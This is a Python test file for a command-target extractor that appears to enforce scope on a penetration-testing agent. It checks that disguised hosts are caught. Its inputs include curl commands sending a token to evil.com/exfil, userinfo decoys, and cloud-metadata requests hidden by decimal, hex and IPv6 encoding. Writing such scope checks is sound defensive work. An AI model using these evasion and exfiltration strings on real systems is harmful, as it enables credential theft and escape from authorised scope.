from decepticon.middleware._command_targets import extract_targets


def test_userinfo_decoy_yields_real_host_not_in_scope_label():
    targets = extract_targets("curl http://in-scope.acme.com@evil.com/")
    assert "evil.com" in targets
    assert "in-scope.acme.com" not in targets


def test_userinfo_with_password_decoy_yields_real_host():
    targets = extract_targets("curl https://api.acme.com:tok@evil.com/exfil")
    assert "evil.com" in targets
    assert "api.acme.com" not in targets


def test_decimal_encoded_imds_normalized_to_dotted_quad():
    targets = extract_targets("curl http://2852039166/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_hex_encoded_imds_normalized_to_dotted_quad():
    targets = extract_targets("curl http://0xa9fea9fe/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_ipv6_literal_url_host_extracted():
    targets = extract_targets("curl http://[fd00:ec2::254]/latest/meta-data/")
    assert "fd00:ec2::254" in targets


def test_compound_resolve_argument_does_not_emit_junk_token():
    targets = extract_targets(
        "curl --resolve metadata.google.internal:80:169.254.169.254 "
        "http://metadata.google.internal/"
    )
    assert "169.254.169.254" in targets
    assert "metadata.google.internal" in targets
    assert "metadata.google.internal:80:169.254.169.254" not in targets


def test_small_integer_host_not_mangled_into_ip():
    assert "0.0.31.144" not in extract_targets("curl http://8080/")


def test_plain_url_host_unchanged_regression():
    assert extract_targets("curl http://prod.acme.com/path") == {"prod.acme.com"}


def test_url_with_port_strips_port_regression():
    assert extract_targets("curl https://prod.acme.com:8443/") == {"prod.acme.com"}


def test_plain_ipv4_target_still_extracted_regression():
    assert "10.0.0.5" in extract_targets("nmap -sV 10.0.0.5")


def test_cidr_target_preserved_regression():
    assert "10.0.0.0/24" in extract_targets("nmap -sn 10.0.0.0/24")
